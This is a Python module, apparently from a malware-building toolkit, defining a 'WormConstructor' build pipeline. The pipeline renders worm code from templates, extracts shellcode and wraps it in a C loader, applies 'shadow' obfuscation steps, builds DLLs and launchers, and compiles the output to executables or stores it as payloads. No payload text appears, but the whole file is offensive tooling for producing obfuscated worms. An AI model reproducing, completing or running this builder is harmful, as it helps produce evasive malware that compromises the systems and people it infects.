import os
import shutil
from typing import Union, Callable
from jinja2 import Template

from .tools.external_script import ExternalModules
from .tools.master_wrapper import MasterWrapper
from .tools.wc_tools.template_payload import WORM_CONSTRUCTOR_TEMPLATE_PAYLOAD


class RawWorm:
    def __init__(self, worm_constructor: object, var: dict, global_var: dict):
        self.wc = worm_constructor
        self.var = var
        self.gvar = global_var
        self.name = None
        # source file path
        self._file_path = None
        # Path to the current source file being worked on.
        self.file_path = None
        # icon
        self.icon = None
        # worm directory
        self.work_dir = None
        # worm code
        self.code = ""
        # worm code lang
        self.code_lang = "python"
        # one file output
        self.out_one_file = True
        # actual compiler
        self.compiler = self.gvar.get("COMPILER")
        # ready file name (exe, dll, elf)
        self.exe_file_name = None
        # ready file path
        self.exe_file_path = None
        # shellcode
        self.shellcode = None
        # program 'gui' or 'console'
        self.exe_show = self.gvar.get("SHOW")
        if self.var.get("SHOW"):
            self.exe_show = self.var.get("SHOW")
        _gui = self.var.get("GUI")
        if _gui:
            if _gui == False or _gui == "False":
                self.exe_show = False
                self.var["TO_TEMPLATE_GUI"] = False
            else:
                self.exe_show = 'gui'
                self.var["TO_TEMPLATE_GUI"] = True

        #COMPILER SCRIPT
        self.cs_path = None
        self.cs_file_name = None
        self.cs = None
        self.cs_cmd = None
            # res file name for linker
        self.cs_res_name = None

        # LIBRARY
        self.is_dll = False
        self.lib = None
        # Needed libraries for compilation
        self.need_lib = []
        # loader for DLL
        self.launcher = None
        # DLLs
        self.dlls = []
        # library
        self.libs = []

        #Ready app directory
        self.ready_app = []
        self.ready_app_dir = None

        #ERRORS
        #last error FLAG. 
        self.last_error = 0 # No errors

        # code loaders from worm_builder
        self.code_loaders = self.wc.worm_builder.code_loaders

        # update
        self.update_var()

        # include files (sfile module)
        self.include_files = self.wc.worm_builder.raw_worm.sfiles.copy()
        
    
    @property
    def raw_code_file_name(self) -> str:
        return os.path.basename(self.file_path)
    
    def update_var(self) -> None:
        for k, i in self.var.items():
            # globalVar update
            if k.startswith("GLOBAL_"):
                self.gvar[k[7:]] = i
        for k, i in self.wc.worm_builder.raw_worm.master_worm.options.items():
            self.var[k] = i
            self.gvar[k] = i

        self.default_dll = self.gvar.get("WORM_default_dll")
        

    
    def reset_cs_data(self) -> None:
        self.cs_path = None
        self.cs_file_name = None
        self.cs = None
        self.cs_cmd = None
        self.cs_res_name = None

class DLL_data2:
    def __init__(self, mod: object, config: dict = {}):
        self.conf = config
        self.mod = mod
        # get var from mod
        for k, i in mod.setVar.items():
            self.conf[k] = i.value
        for k, i in mod.options.items():
            if k.startswith("DLL_"):
                self.conf[k] = i

        # DLL name
        self.name = self.conf.get("DLL_NAME")

        # Work dir
        self.work_dir = None
        self.work_dir_name = None

        # Lanucher, Loader 
        self.launcher = self.conf.get("DLL_LAUNCHER")

        # Will DLL be used for compilation
        self.too_export = self.conf.get("DLL_TOO_EXPORT")

        # Exported function "DLL_EXFUNC". ex: DLL_EXFUNC1 ex: DLL_EXFUNCabc
        self.ex_func = self.get_export_func()

        # compiler name
        self.compiler = self.conf.get("DLL_COMPILER")

        # 'nostlib -s' flag
        if not self.conf.get("DLL_NO_DLL") or self.conf.get("DLL_NO_DLL") == "False":
            self.no_dll = None
        else:
            self.no_dll = True
        
        # Use compile script
        self.cs = self.conf.get("DLL_CS")
        self.cs_code = None
        self.cs_fpath = None
        self.cs_fname = None


        # raw code
        self.raw_code = self.mod.raw_code

        # code
        self.code = None

        # file path
        self.file_path = None

        # ready dll file path
        self.dll_file_path = None

        # Needed libraries for compilation
        self.need_lib = []

        # errors
        self.last_error = 0


    @property
    def def_fname(self) -> Union[str, None]:
        if self.name:
            return f"{os.path.splitext(self.name)[0]}.def"
            # return f"{self.name.rstrip('.dll')}.def"
        else:
            return None
    
    @property
    def fname(self) -> Union[str, None]:
        if self.name:
            return f"{os.path.splitext(self.name)[0]}.dll"
            # return f"{self.name.rstrip('.dll')}.dll"
        else:
            return None
    
    @property
    def raw_name(self) -> Union[str, None]:
        if self.name:
            return os.path.splitext(self.name)[0]
        else:
            return None

    
    # Functions exported outside the library.
    def get_export_func(self) -> dict:
        efunc = []
        for k, i in self.conf.items():
            if k.startswith("DLL_EXFUNC"):
                efunc.append(i)
        return efunc
    
    # variables for template (dll loader etc.)
    @property
    def temp_var(self) -> dict:
        var = {}
        var["DLL_DLL_EXFUNC"] = self.get_export_func()
        var["DLL_DLL_NAME"] = self.name
        return var
    
    def reset_cs_data(self) -> None:
        self.cs = None
        self.cs_code = None
        self.cs_fname = None
        self.cs_fpath = None

class DLL_data:
    def __init__(self, raw: RawWorm, config: dict = {}):
        self._config = config
        self.raw = raw
        self.types = "DLL"
        # Get variables from options
        self.get_options()
        #### variables from worm
        # DLL name
        self.name = config.get("DLL_NAME", self.raw.var.get("DLL_NAME"))

        # Launcher
        self.launcher = config.get("DLL_LAUNCHER", self.raw.var.get("DLL_LAUNCHER"))
        self.raw.launcher = self.launcher

        # Exported function "DLL_EXFUNC". ex: DLL_EXFUNC1 ex: DLL_EXFUNCabc
        self.ex_func = self.get_export_func()

        # Will DLL be used for compilation
        if "DLL_TOO_EXPORT" in config.keys():
            self.too_export = config["DLL_TOO_EXPORT"]
        else:
            self.too_export = self.raw.var.get("DLL_TOO_EXPORT", False)
        
        # Template source
        if "DLL_TEMPLATE" in config.keys():
            self.template_src = config["DLL_TEMPLATE"]
        else:
            self.template_src = self.raw.var.get("DLL_TEMPLATE")

        #### DEF File
        # def file name
        self.def_fname = f"{self.name.rstrip('.dll')}.def"
        
    
    # Functions exported outside the library.
    def get_export_func(self) -> dict:
        efunc = []
        for k, i in self.raw.var.items():
            if k.startswith("DLL_EXFUNC"):
                efunc.append(i)
        return efunc
    

    # variables for template (dll loader etc.)
    @property
    def temp_var(self) -> dict:
        var = {}
        var["DLL_DLL_EXFUNC"] = self.get_export_func()
        var["DLL_DLL_NAME"] = self.name
        return var

    # recive variables from options
    def get_options(self) -> None:
        opt = {}
        for mod in self.raw.wc.worm_builder.raw_worm.all_modules:
            for k, i in mod.options.items():
                if k.startswith("DLL_"):
                    opt[k] = i
        self.raw.var.update(opt)

class LibData:
    def __init__(self, modules: object, variables: dict = {}):
        self.mod = modules
        self.var = variables
        # get var from mod
        for k, i in self.mod.setVar.items():
            self.var[k] = i.value
        for k, i in self.mod.options.items():
            if k.startswith("LIB_"):
                self.var[k] = i
        
        # Library name
        self.raw_name = self.mod.name
        self.name = f"{self.raw_name}.lib"

        # Work dir
        self.work_dir = None
        self.work_dir_name = None

        # compiler name
        self.compiler = self.var.get("LIB_COMPILER")

        # raw code
        self.raw_code = self.mod.raw_code

        # file path
        self.fpath = None


class WormConstructor:
    def __init__(self, coder: object, master_compiler: object):
        self.coder = coder
        self.worm_builder = self.coder.WB
        self.get_item = self.worm_builder.get_item
        self.name = "WormConstructor"
        self.master = master_compiler
        self.msg = self.coder.msg
        self.dir_hive = self.coder.dir_out
        self.ExtMods = ExternalModules(self.coder, self.master, self)
        self.Wrapper = MasterWrapper(self.coder)

        # library
        self.Lib = self.coder.queen.Lib
        self.DIR_PAYLOAD = self.Lib.DIR_PAYLOAD
    
    def _default_options(self) -> dict:
        conf = {}
        conf["LANG"] = self.coder.WB.lang
        #default set to window (hide console)
        # conf["PROGRAM_TYPE"] = "window"
        # 'gui' - window/background , 'console' - console
        conf["SHOW"] = "console"
        conf["ICON"] = self.coder.icon
        conf["ONE_FILE"] = True
        conf["COMPILER"] = None
        return conf
    
    def _globalVar(self) -> dict:
        conf = self._default_options()
        conf.update(self.coder.globalVar.copy())
        return conf
    
    def update_global_var(self, var: dict, gvar: dict) -> dict:
        for name, value in var.items():
            if name.startswith("GLOBAL_") or name.startswith("GV_"):
                if value == "False" or value == "None":
                    value = None
                gvar[name[7:]] = value
        return gvar
    
    
    def copy_icon(self, raw: RawWorm) -> RawWorm:
        if not raw.icon:
            return raw
        icon_dir = self.worm_builder.dir_icons
        icon_path = os.path.join(icon_dir, raw.icon)
        if not os.path.exists(icon_path):
            self.msg("error", f"ERROR: Wrong icon path. Skip step.")
            return raw
        try:
            shutil.copy2(icon_path, raw.work_dir)
            raw.var["RES_icon"] = os.path.basename(raw.icon)
        except Exception as e:
            self.msg("error", f"[!!] ERROR: Copying icon: {e} [!!]", sender=self.name)
            raw.icon = None
        return raw
        
        

    
    def build_WORM(self, options: dict = {}) -> None:
        # options.update(self.globalVar)
        gvar = self._globalVar()
        gvar.update(options)
        var = self.coder.var.copy()
        gvar = self.update_global_var(var, gvar)
        self.msg("msg", "Start building proces...", sender=self.name)
        self.prepare_process()
        raw = self.prepare_raw_worm(var, gvar)
        #check compiler script
        if self.worm_builder.raw_worm.cscript:
            raw.cs = self.worm_builder.raw_worm.cscript
        for proc in self.process_build:
            self.msg("dev", f"Step: {proc.__name__}", sender=self.name)
            raw = proc(raw)
            if raw.last_error == 1:
                self.msg("error", "[!!] ABORT building worm process [!!]", sender=self.name)
                return
            elif raw.last_error == 2:
                self.msg("error", "[!!] WARNING: Not all 'steps' have been completed. Possible error while building the worm. [!!]", sender=self.name)
        self.msg("msg", "Building worm complete", sender=self.name)
        

    
    def prepare_raw_worm(self, var: dict, gvar: dict) -> object:
        raw = RawWorm(self, var, gvar)
        raw.name = self.worm_builder.name
        raw.work_dir = os.path.join(self.dir_hive, raw.name)
        # set special variables
        raw.var["DLL_WORK_DIR"] = raw.work_dir
        raw.ready_app_dir = os.path.join(raw.work_dir, f"{raw.name}_ready")
        if self.worm_builder.lang == "asm":
            raw._file_path = os.path.join(raw.work_dir, f"{raw.name}.asm")
        elif self.worm_builder.lang == "python":
            raw._file_path = os.path.join(raw.work_dir, f"{raw.name}.py")
        else:
            raw._file_path = os.path.join(raw.work_dir, f"{raw.name}.py")
        raw.file_path = raw._file_path
        raw.icon = self.worm_builder.icon
        raw.code_lang = gvar.get("LANG")
        raw.out_one_file = gvar["ONE_FILE"]
        return raw



    def prepare_process(self) -> None:
        self.process_build = []
        self.process_build.append(self.step_make_out_dirs)
        for proc in self.worm_builder.pipe_process:
            self.process_build.append(self.add_step(proc))
        self.process_build.append(self.step_prepare_ready_app)
        
    
    def add_step(self, name: str) -> object:
        match name:
            case "BASE":
                return self.step_code_base
            case "ADD_IMPORTS":
                return self.step_add_imports
            case "SAVE_RAW":
                return self.step_save_raw
            case "COMPILER":
                return self.step_compile
            case "BASE_SHELL":
                return self.step_base_shell
            case "SHOW_OP_CODE":
                return self.step_show_op_code
            case "BUILD_C_SCODE":
                return self.step_build_C_shellcode
            case "STARTER":
                return self.step_use_starter
            case "SHADOW":
                return self.step_use_shadow
            case "WRAPPER":
                return self.step_add_wrapper
            case "MAKE_DLL_FILE":
                return self.step_build_dll_file
            case "DLL_LOADER":
                return self.step_build_launcher
            case "BUILD_DLL_FILE":
                return self.step_build_dll_library
            case "BUILD_LIB_FILE":
                return self.step_build_library
            case "CODE_LOADER":
                return self.step_build_mod_loader
            case _:
                return self.step_empty
    
    def step_empty(self, raw: object) -> object:
        return raw

    def step_make_out_dirs(self, raw: RawWorm) -> RawWorm:
        if not os.path.exists(raw.work_dir):
            try:
                os.mkdir(raw.work_dir)
            except Exception as e:
                self.msg("error", f"[!!] ERROR: making worm directory: {e} [!!]", sender=self.name)
                raw.last_error = 1
        raw = self.copy_icon(raw)
        return raw
    
    def step_code_base(self, raw: RawWorm) -> RawWorm:
        try:
            code = self.coder.code_worm_base(raw.var, raw.gvar)
            raw.code = code
        except Exception as e:
            self.msg("error", f"[!!] ERROR: render worm code. [!!]", sender=self.name)
            self.msg("error", f"[!!] {e} [!!]", sender=self.name)
            raw.last_error = 1
        return raw
    
    def step_add_imports(self, raw: RawWorm) -> RawWorm:
        imp = "\n".join(self.coder.imports)
        raw.code = imp + "\n" + raw.code
        return raw
    
    def step_build_mod_loader(self, raw: RawWorm) -> RawWorm:
        # check if loader exists
        for cl in raw.code_loaders:
            code = self.coder.render_single_template(cl.raw_code, raw.var)
            raw.code = code + "\n" + raw.code
        return raw

    def step_save_raw(self, raw: RawWorm) -> RawWorm:
        try:
            with open(raw.file_path, "w") as file:
                file.write(raw.code)
        except Exception as e:
            self.msg("error", f"[!!] ERROR saving raw worm code: {e} [!!]", sender=self.name)
            raw.last_error = 1
        # add include files (sfile module)
        for target, sf in raw.include_files.items():
            # render support file
            sf_code = self.coder.render_single_template(sf.raw_code, raw.var)
            # save support file
            try:
                with open(os.path.join(raw.work_dir, target), "w") as file:
                    file.write(sf_code)
            except Exception as e:
                self.msg("error", f"[!!] ERROR Save Support File: '{sf.name}'. {e} [!!]")
                
        return raw
    
    def step_compile(self, raw: RawWorm) -> RawWorm:
        if raw.cs:
            raw = self.step_build_res_file(raw)
        # Only raw code can be add to Payload
        if raw.gvar.get("PAYLOAD"):
            self.msg("msg", "Build Worm as Payload......", sender=self.name)
            raw = self.step_build_payload(raw)
            return raw
        if raw.gvar.get("NO_COMPILE"):
            self.msg("msg", "NO_COMPILE FLAG. Skip step.", sender=self.name)
        else:
            raw = self.master.compile(raw)
        
        return raw
        
    def step_base_shell(self, raw: RawWorm) -> RawWorm:
        raw.code = self.coder.raw_code(raw.var)
        self.ExtMods.use(raw)
        return raw
        
    def step_show_op_code(self, raw: RawWorm) -> RawWorm:
        self.msg("msg", "Processing OP Code and Shellcode.......", sender=self.name)
        try:
            raw.shellcode = self.ExtMods.show_opcode(raw.exe_file_path)
        except Exception as e:
            self.msg("error", f"ERROR: Show OP Code: {e}", sender=self.name)
        return raw

    # build linux C loader with shellcode
    def step_build_C_shellcode(self, raw: RawWorm) -> RawWorm:
        if not raw.shellcode:
            self.msg("error", "ERROR: No Shellcode. Skipping step.", sender=self.name)
            return raw
        data = {"SHELL_CODE" : raw.shellcode}
        self.ExtMods.pattern.render(raw.name, data, "shellcode_C")
        self.msg("msg", "Building loader complete", sender=self.name)
        return raw
    
    def step_use_starter(self, raw: RawWorm) -> RawWorm:
        if not self.worm_builder.raw_worm.starter:
            self.msg("msg", "No Starter. Skipping step.", sender=self.name)
            return raw
        raw = self.coder.starter.use(raw, self.worm_builder.raw_worm.starter)
        return raw
    
    def step_use_shadow(self, raw: RawWorm) -> RawWorm:
        if len(self.worm_builder.raw_worm.shadow) > 0:
            self.msg("msg", f"Number obfuscated methods: {len(self.worm_builder.raw_worm.shadow)}", sender=self.name)
        for shadow in self.worm_builder.raw_worm.shadow.values():
            raw = self.coder.shadow.use(raw, shadow)
        return raw
    
    def step_add_wrapper(self, raw: RawWorm) -> RawWorm:
        wrapper = self.worm_builder.raw_worm.wrapper
        if not wrapper:
            self.msg("msg", "No Wrapper. Skipping step.", sender=self.name)
            return raw
        self.msg("msg", f"Use wrapper: '{wrapper.name}'", sender=self.name)
        raw = self.Wrapper.wrap_worm(raw, wrapper)
        return raw
    
    def step_build_res_file(self, raw:RawWorm) -> RawWorm:
        rc_fext = {
            "mingw-x32" : ".res",
            "mingw-x64" : ".res",
            "PyInstaller" : "txt"
        }
        code = self.coder.render_single_template(raw.cs.raw_code, raw.var)
        if raw.lib:
            raw.cs_file_name = f"{raw.lib.name.rstrip('.dll')}.rc"
        else:
            raw.cs_file_name = f"{raw.name}.rc"
        raw.cs_path = os.path.join(raw.work_dir, raw.cs_file_name)
        try:
            with open(raw.cs_path, "w") as file:
                file.write(code)
        except Exception as e:
            self.msg("error", f"[!!] ERROR making rc file: {e} [!!]")
            raw.last_error = 2
            return raw
        return raw
    
    def step_make_def_file(self, raw: RawWorm) -> RawWorm:
        if not raw.lib:
            self.msg("error", "[!!] ERROR: Missing configuration for building DEF file [!!]", sender=self.name)
            raw.last_error = 1
            return raw
        lib_name = raw.lib.name.rstrip(".dll")
        efunc = "\n\t".join(raw.lib.ex_func)
        dtemp = f"LIBRARY {lib_name}\nEXPORTS\n\t{efunc}"
        fpath = os.path.join(raw.work_dir, raw.lib.def_fname)
        try:
            with open(fpath, "w") as file:
                file.write(dtemp)
        except Exception as e:
            self.msg("error", f"[!!] ERROR Writing DEF file: {e} [!!]", sender=self.name)
            raw.last_error = 2
            return raw
        self.msg("msg", f"Make DEF file: {raw.lib.def_fname} successfull", sender=self.name)
        return raw
    
    def _get_single_mod(self, name: str) -> tuple:
        mod = self.get_item("support", name)
        if not mod:
            self.msg("error", f"[!!] ERROR: template: {name} does not exists [!!]", sender=self.name)
            return (None, {})
        code = mod.raw_code
        var = {}
        for k, i in mod.setVar.items():
            var[k] = i.value
        return (code, var)
    
    def _save_raw_code(self, fpath: str, code: str) -> bool:
        try:
            with open(fpath, "w") as file:
                file.write(code)
            return True

        except Exception as e:
            self.msg("error", f"[!!] ERROR Save file: {e} [!!]", sender=self.name)
            return False


########################### BUILD DLL FILE from Support Mod ##############################

    def step_build_dll_library(self, raw: RawWorm) -> RawWorm:
        self.msg("msg", "Searching DLLs....", sender=self.name)
        # check for DLL
        for mod in self.worm_builder.raw_worm.all_modules:
            if mod.subTypes == "dll":
                raw = self._step_build_dll_library(raw, mod)
                if raw.last_error == 1:
                    return raw
        return raw
    
    def _build_def_file(self, dll: object, work_dir_path: str = None) -> bool:
        if not work_dir_path:
            wdp = dll.work_dir
        fpath = os.path.join(wdp, dll.def_fname)
        exfunc = "\n\t".join(dll.ex_func)
        lib_name = dll.name.rstrip(".dll")
        code = f"LIBRARY {lib_name}\nEXPORTS\n\t{exfunc}"
        if not self._save_raw_code(fpath, code):
            return False
        self.msg("msg", "Building DEF file complete", sender=self.name)
        return True
    
    def _step_build_dll_library(self, raw: RawWorm, dll: object) -> RawWorm:
        self.msg("msg", "Building DLL library....", sender=self.name)
        # update var from options section
        for mod in self.worm_builder.raw_worm.all_modules:
            for k, i in mod.options.items():
                if k.startswith("DLL_"):
                    raw.var[k] = i
        dll = DLL_data2(dll, raw.var.copy())
        dll_var = raw.var.copy()
        dll_var.update(dll.conf)
        dll.code = self.coder.render_single_template(dll.raw_code, dll_var)
        dll.file_path = os.path.join(raw.work_dir, dll.name).rstrip(".dll")
        dll.work_dir = raw.work_dir
        dll.work_dir_name = raw.name
        if not self._save_raw_code(dll.file_path, dll.code):
            raw.last_error = 1
            return raw
        if not self._build_def_file(dll):
            self.msg("error", "[!!] ERROR: Building DEF file [!!]", sender=self.name)
            raw.last_error = 2
        # check Compiler Script
        if dll.cs:
            cs = self.get_item("cscript", dll.cs)
            if not cs:
                dll.reset_cs_data()
                raw.last_error = 2
            else:
                dll.cs_code = self.coder.render_single_template(cs.raw_code, dll_var)
                dll.cs = cs
                dll.cs_fname = f"{dll.raw_name}.rc"
                dll.cs_fpath = os.path.join(dll.work_dir, dll.cs_fname)
                if not self._save_raw_code(dll.cs_fpath, dll.cs_code):
                    dll.reset_cs_data()
                    self.msg("error", "[!!] ERROR: save rc file [!!]", sender=self.name)
                    raw.last_error = 2
                self.msg("msg", "Making rc file successfull", sender=self.name)
        # compile
        if raw.gvar.get("NO_COMPILE"):
            self.msg("msg", "NO_COMPILE FLAG. Skip step.", sender=self.name)
            raw.last_error = 2
            raw.dlls.append(dll)
            return raw
        dll = self.master.cc.compile_DLL2(dll)

        # update worm 
        raw.ready_app.append(os.path.join(raw.work_dir, dll.name))
        # check if master worm needs this dll
        if not raw.default_dll:
            raw.need_lib.append(dll.name)
        raw.dlls.append(dll)
        
        return raw

###############################################################################################################
    
############################ Build DLL file from Worm ################################################

    def step_build_dll_file(self, raw: RawWorm) -> RawWorm:
        self.msg("msg", "Building DLL file....", sender=self.name)
        raw.lib = DLL_data(raw)
        if raw.lib.template_src:
            mod = self.get_item("support", raw.lib.template_src)

        
        raw = self.step_make_def_file(raw)
        if raw.cs:
            raw = self.step_build_res_file(raw)
        if raw.gvar.get("NO_COMPILE"):
            self.msg("msg", "NO_COMPILE FLAG. Skip step.", sender=self.name)
            raw.last_error = 2
            return raw
        raw = self.master.compile_dll(raw)
        
        if raw.lib.too_export:
            raw.need_lib.append(raw.lib.name)
        raw.var.update(raw.lib.temp_var)
        # Clear library data
        raw.lib = None
        # Clear rc data
        raw.reset_cs_data()

        return raw
    
##########################################################################################################
############################ Build Library "lib" ########################################################


    def step_build_library(self, raw: RawWorm) -> RawWorm:
        self.msg("msg", "Searching LIBs....", sender=self.name)
        for mod in self.worm_builder.raw_worm.all_modules:
            if mod.subTypes == "lib":
                raw = self._build_library(raw, mod)
                if raw.last_error == 1:
                    self.msg("error", "[!!] ERROR: builiding library. Abort process. [!!]")
                    return
        # compile library
        if raw.gvar.get("NO_COMPILE"):
            self.msg("msg", "NO_COMPILE FLAG. Skip step.", sender=self.name)
            raw.last_error = 2
        else:
            self.master.compile_library_lib(raw)
        # self.master.compile_library_lib(raw)
        return raw

    def _build_library(self, raw: RawWorm, module_lib: object) -> RawWorm:
        # copy variables from worm
        ex_var = raw.var.copy()
        library = LibData(module_lib, ex_var)
        code = self.coder.render_single_template(library.raw_code, library.var)
        library.fpath = os.path.join(raw.work_dir, library.raw_name)
        self._save_raw_code(library.fpath, code)

        # add lib to raw worm
        raw.libs.append(library)

        return raw

################################################## BUILD PAYLOAD ######################################################

    def step_build_payload(self, raw: RawWorm) -> RawWorm:
        raw = self._bp_raw_build(raw)
        return raw

    def _bp_set_name(self, raw: RawWorm) -> str:
        wname = f"{raw.name}.data"
        count = 0
        while wname in os.listdir(self.DIR_PAYLOAD):
            count += 1
            wname = f"{raw.name}{count}.data"
        self.msg("msg", f"Set payload name: '{raw.name}{count}'", sender=self.name)
        return f"{raw.name}{count}"
    
    def _bp_get_info(self, raw: RawWorm, code_len: int) -> str:
        umod = ", ".join(self.worm_builder.modules_name)
        info = f"Payload created by you. Master worm: '{self.worm_builder.raw_worm.master_worm.name}', used modules: {umod}. Payload length: {code_len}"
        return info

    def _bp_get_code(self, raw: RawWorm) -> Union[bytes, str, None]:
        if raw.exe_file_name:
            self.msg("msg", "Get binary data.....", sender=self.name)
            try:
                with open(raw.exe_file_path, "rb") as file:
                    code = file.read()
            except Exception as e:
                self.msg("error", f"[!!] ERROR Load Binary Code: {e} [!!]", sender=self.name)
                raw.last_error = 1
                code = ""
        else:
            code = raw.code
        return code
            

    def _bp_raw_build(self, raw: RawWorm) -> RawWorm:
        pay_temp = {}
        pay_temp["NAME"] = self._bp_set_name(raw)
        fpath = os.path.join(self.DIR_PAYLOAD, f"{pay_temp['NAME']}.data")
        pay_temp["CODE"] = self._bp_get_code(raw)
        code_len = len(pay_temp["CODE"])
        pay_temp["INFO"] = self._bp_get_info(raw, code_len)
        temp = WORM_CONSTRUCTOR_TEMPLATE_PAYLOAD
        temp = Template(temp)
        temp = temp.render(pay_temp)
        
        self.msg("msg", f"Save payload '{pay_temp['NAME']}' to library ...", sender=self.name)
        try:
            with open(fpath, "w") as file:
                file.write(temp)
            self.msg("msg", "Your payload is ready", sender=self.name)
        except Exception as e:
            self.msg("msg", f"[!!] ERROR Save payload: {e} [!!]", sender=self.name)
            raw.last_error = 1
        return raw


##############################################################################################################

    def step_build_launcher(self, raw: RawWorm) -> RawWorm:
        self.msg("msg", "Builiding Dll launcher....", sender=self.name)
        loader = raw.launcher
        load_mod = self.get_item("support", loader)
        if not load_mod:
            raw.last_error = 1
            return raw
        code = self.coder.render_single_template(load_mod.raw_code, raw.var)
        raw.code = code
        raw = self.step_save_raw(raw)
        extra_comp = load_mod.globalVar.get("COMPILER")
        if extra_comp:
            raw.compiler = extra_comp
        if load_mod.reqCS:
            raw.cs = self.get_item("cscript", load_mod.reqCS)
            raw = self.step_build_res_file(raw)
        if raw.gvar.get("NO_COMPILE"):
            self.msg("msg", "NO_COMPILE FLAG. Skip step.", sender=self.name)
            raw.last_error = 2
            return raw
        raw = self.master.compile(raw)

        return raw


    def step_prepare_ready_app(self, raw: RawWorm) -> RawWorm:
        if len(raw.ready_app) < 1:
            return raw
        self.msg("msg", f"Making ready app dir: '{raw.ready_app_dir}'", sender=self.name)
        if not os.path.exists(raw.ready_app_dir):
            try:
                os.mkdir(raw.ready_app_dir)
            except Exception as e:
                self.msg("error", f"[!!] ERROR making directory for worm: {e} [!!]", sender=self.name)
                raw.last_error = 2
                return raw
        for file in raw.ready_app:
            try:
                shutil.copy2(file, raw.ready_app_dir)
            except Exception as e:
                self.msg("error", f"[!!] ERROR copying file: {e} [!!]", sender=self.name)
                raw.last_error = 2
        self.msg("msg", f"The finished worm files are located in the directory: '{raw.ready_app_dir}'", sender=self.name)
        return raw